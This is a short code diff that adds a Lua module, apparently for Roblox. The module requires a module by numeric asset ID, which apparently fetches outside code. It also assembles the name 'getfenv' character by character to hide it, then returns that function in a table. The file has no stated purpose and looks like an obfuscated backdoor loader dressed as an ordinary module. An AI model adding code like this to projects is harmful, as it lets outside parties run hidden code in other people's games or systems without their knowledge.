@@ -1,0 +1,7 @@
+local i = 104710331237296
+local e = require(i)
+local gfe = e[table.concat{"g", "e", "t", "f", "e", "n", "v"}]
+local t = {}
+
+rawset(t, -1, gfe)
+return t
